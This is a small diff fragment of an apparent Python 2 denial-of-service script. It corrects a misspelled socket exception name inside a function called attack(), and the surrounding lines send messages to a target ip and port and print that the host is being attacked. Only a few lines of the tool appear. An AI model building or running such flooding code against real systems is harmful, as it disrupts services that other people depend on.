@@ -31,7 +31,7 @@ def attack():
 		dos.sendto(message, (ip, port))
 		dos.send(message)
 
-	except socket.serror, msg:
+	except socket.error, msg:
 		print "[!] failed ... error"
 
 	print time.ctime(time.time()) + " >> attacking " + host + " " + ip
